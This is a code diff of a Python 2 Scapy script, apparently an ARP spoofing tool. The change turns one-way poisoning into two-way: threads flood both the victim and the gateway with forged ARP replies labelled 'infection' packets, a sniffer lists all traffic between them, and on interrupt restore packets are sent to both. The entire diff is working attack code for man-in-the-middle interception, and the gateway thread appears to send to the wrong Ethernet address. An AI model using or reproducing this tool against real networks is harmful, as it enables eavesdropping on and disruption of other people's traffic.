@@ -80,10 +80,36 @@ def arpSniff():
 def ARPrestore(signal, frame):
 	print "\n"+bcolors.FAIL + '[*] Detect SIGINT interrupt' + bcolors.ENDC
         print bcolors.WARNING + '[*] Send ARP Restore Packet to ['+targetIP+']' + bcolors.ENDC
-	arpPacket = Ether(src=myInfo.GetMyMac(), dst=targetMAC, type=2054)/ARP(pdst=targetIP, hwdst=targetMAC,  psrc=myInfo.GetMyGateway(), hwsrc=gatewayMAC, ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
+	VictimRestorePacket = Ether(src=myInfo.GetMyMac(), dst=targetMAC, type=2054)/ARP(pdst=targetIP, hwdst=targetMAC,  psrc=myInfo.GetMyGateway(), hwsrc=gatewayMAC, ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
+
+        print bcolors.WARNING + '[*] Send ARP Restore Packet to ['+myInfo.GetMyGateway()+']' + bcolors.ENDC
+	GatewayRestorePacket = Ether(src=myInfo.GetMyMac(), dst=gatewayMAC, type=2054)/ARP(pdst=myInfo.GetMyGateway(), hwdst=gatewayMAC,  psrc=targetIP, hwsrc=targetMAC, ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
 	for i in range(3):
-		sendp(arpPacket, verbose=False)
+		sendp(VictimRestorePacket, verbose=False)
+		sendp(GatewayRestorePacket, verbose=False)
         sys.exit(0)
+
+def SendInfectionARP(eth_src_mac, eth_dst_mac, arp_pdst, arp_hwdst, arp_psrc, arp_hwsrc):
+	arpPacket = Ether(src=eth_src_mac, dst=eth_dst_mac, type=2054)/ARP(pdst=arp_pdst, hwdst=arp_hwdst,  psrc=arp_psrc, hwsrc=arp_hwsrc, ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
+	
+	while(1):
+		sendp(arpPacket, verbose=False)					# Send ARP Infection Packet
+		print bcolors.WARNING + "[*] Send ARP Infection Packet to  - ["+arp_pdst+"]"+ bcolors.ENDC
+		time.sleep(1)
+
+def RelayPacket(pkt):
+	global targetMAC, gatewayMAC
+	
+	if Ether in pkt:
+		sourceMAC = pkt.sprintf("%Ether.src%")
+		if sourceMAC == targetMAC:
+			ls(pkt)
+		elif sourceMAC == gatewayMAC:
+			ls(pkt)
+
+def ForFowardPacketSniff():
+	sniff(prn=RelayPacket, store=0)
+
 
 if __name__ == "__main__":
 	#------------------- argument filtering -------------------
@@ -140,7 +166,19 @@ if __name__ == "__main__":
 	print bcolors.OKGREEN + "[+] Sussess to Get Target MAC Address - ["+targetMAC+"]"+ bcolors.ENDC
 
 	#----------------------------------------------------------
+	signal.signal(signal.SIGINT, ARPrestore)
 
+	thread.start_new_thread(SendInfectionARP, (myInfo.GetMyMac(), targetMAC, targetIP, targetMAC, myInfo.GetMyGateway(), myInfo.GetMyMac()))              			# Send to Victim, ARP Infection Packet 
+
+	thread.start_new_thread(SendInfectionARP, (myInfo.GetMyMac(), targetMAC, myInfo.GetMyGateway(), gatewayMAC, targetIP, myInfo.GetMyMac()))              			# Send to Gateway, ARP Infection Packet 
+	time.sleep(1)
+	
+	thread.start_new_thread(ForFowardPacketSniff, ())
+
+	time.sleep(1000)
+
+	ARPrestore(signal.SIGINT, ARPrestore)
+'''
 	arpPacket = Ether(src=myInfo.GetMyMac(), dst=targetMAC, type=2054)/ARP(pdst=targetIP, hwdst=targetMAC,  psrc=myInfo.GetMyGateway(), hwsrc=myInfo.GetMyMac(), ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
 	
 	signal.signal(signal.SIGINT, ARPrestore)				# SIGINT Interrupt
@@ -149,7 +187,7 @@ if __name__ == "__main__":
 		sendp(arpPacket, verbose=False)					# Send ARP Infection Packet
 		print bcolors.WARNING + "[*] Send ARP Infection Packet to  - ["+targetIP+"]"+ bcolors.ENDC
 		time.sleep(1)
-
+'''
 
 
 
